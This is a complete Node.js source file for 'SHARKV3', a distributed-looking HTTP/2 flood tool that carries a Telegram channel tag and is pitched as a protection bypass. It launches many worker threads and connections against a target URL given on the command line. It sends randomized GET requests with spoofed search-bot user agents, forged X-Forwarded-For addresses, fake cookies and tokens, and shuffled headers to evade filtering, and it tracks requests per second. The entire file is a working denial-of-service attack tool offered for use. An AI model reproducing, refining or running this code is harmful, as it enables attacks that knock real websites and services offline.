// SHARKV3 - T.ME/STSVKINGDOM + STS/TSP BYPASS V3
const http2 = require('http2');
const net = require('net');
const { Worker, isMainThread, workerData } = require('worker_threads');
const readline = require('readline');

const THREADS = 22;
const POWER_MULTIPLIER = 2;
const MAX_INFLIGHT = 2000;
const LIVE_REFRESH_RATE = 100;
const MAX_RESTARTS = 20;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;
let end;

function randRange(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randIP() {
    return Array.from({ length: 4 }, () => randRange(1, 254)).join('.');
}

function randUA() {
    const bots = ['Googlebot', 'Bingbot', 'DuckDuckBot', 'Applebot'];
    const os = ['Windows NT 10.0', 'Linux x86_64', 'Macintosh; Intel Mac OS X 10_15_7'];
    const bot = bots[Math.floor(Math.random() * bots.length)];
    const version = `${randRange(1, 10)}.${randRange(0, 9)}`;
    return `Mozilla/5.0 (${os[Math.floor(Math.random() * os.length)]}) AppleWebKit/537.36 (KHTML, like Gecko) ${bot}/${version}`;
}

function randReferer() {
    const refs = ['https://google.com/', 'https://bing.com/', 'https://duckduckgo.com/', 'https://facebook.com/', 'https://t.me/stsvkingdom'];
    return refs[Math.floor(Math.random() * refs.length)];
}

function randRoute() {
    const paths = ['STS', 'S.T.S', 'TSP', 'THE-SILENT-PROTOCOL', 'bypass', 'route', 'silent'];
    const path = Array.from({ length: randRange(2, 4) }, () => paths[randRange(0, paths.length - 1)]).join('/');
    return `/${path}/${Math.random().toString(36).substring(7)}?tspid=${randRange(1000, 9999)}`;
}

function randCookie() {
    return `session_id=${Math.random().toString(36).substring(2)}; device_id=${Math.random().toString(36).substring(2)}`;
}

function randHeaderObj() {
    const headers = {
        ':method': 'GET',
        ':path': randRoute(),
        'user-agent': randUA(),
        'referer': randReferer(),
        'x-forwarded-for': randIP(),
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'authorization': `Bearer ${Math.random().toString(36).substring(2)}`,
        'cookie': randCookie(),
        'host': 'victim.site',
        'connection': 'keep-alive'
    };
    const shuffled = {};
    Object.keys(headers).sort(() => Math.random() - 0.5).forEach(k => shuffled[k] = headers[k]);
    return shuffled;
}

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);
    end = Date.now() + duration * 1000;

    console.clear();
    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);

    let restarts = 0;
    function startWorkers() {
        for (let i = 0; i < THREADS; i++) {
            new Worker(__filename, { workerData: { target, duration, connections: randRange(200, 500) } });
        }
        for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
            new Worker(__filename, { workerData: { target, duration, connections: randRange(154, 500) } });
        }
    }
    startWorkers();

    setInterval(() => {
        maxRps = Math.max(maxRps, rpsLastSecond);
        rpsLastSecond = 0;
        renderStats();
    }, LIVE_REFRESH_RATE);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);
        const timeLeft = Math.floor((end - Date.now()) / 1000);
        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`succes: ${successCount}`);
        console.log(`===========================`);
        console.log(`TIME REMAINING: ${timeLeft}s`);
    }

    const server = net.createServer(socket => {
        socket.on('data', d => {
            const msg = d.toString();
            if (msg === 'req') totalRequests++, rpsLastSecond++;
            else if (msg === 'ok') successCount++;
            else if (msg === 'err') errorCount++;
        });
    });
    server.listen(9999);

    process.on('uncaughtException', () => {
        if (++restarts <= MAX_RESTARTS) {
            console.log(`[!] Restarting (${restarts}/${MAX_RESTARTS})...`);
            startWorkers();
        } else {
            console.log('[x] Max restarts reached.');
            process.exit(1);
        }
    });
} else {
    const { target, duration, connections } = workerData;
    const endTime = Date.now() + duration * 1000;
    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    function sendLoop(client, inflight) {
        if (Date.now() > endTime || client.destroyed) return;

        if (inflight.count < MAX_INFLIGHT) {
            try {
                inflight.count++;
                const req = client.request(randHeaderObj());

                req.on('response', () => {
                    inflight.count--;
                    sendStat('ok');
                });
                req.on('error', () => {
                    inflight.count--;
                    sendStat('err');
                });

                req.end();
                sendStat('req');
            } catch {
                inflight.count--;
                sendStat('err');
            }
        }
        setTimeout(() => sendLoop(client, inflight), randRange(1, 5));
    }

    function createConnection() {
        if (Date.now() > endTime) return;

        const client = http2.connect(target);
        const inflight = { count: 0 };

        client.on('error', () => client.destroy());
        client.on('goaway', () => client.close());
        client.on('close', () => setTimeout(createConnection, 250));
        client.on('connect', () => {
            for (let i = 0; i < connections; i++) sendLoop(client, inflight);
        });
    }

    for (let i = 0; i < connections; i++) createConnection();
                  }
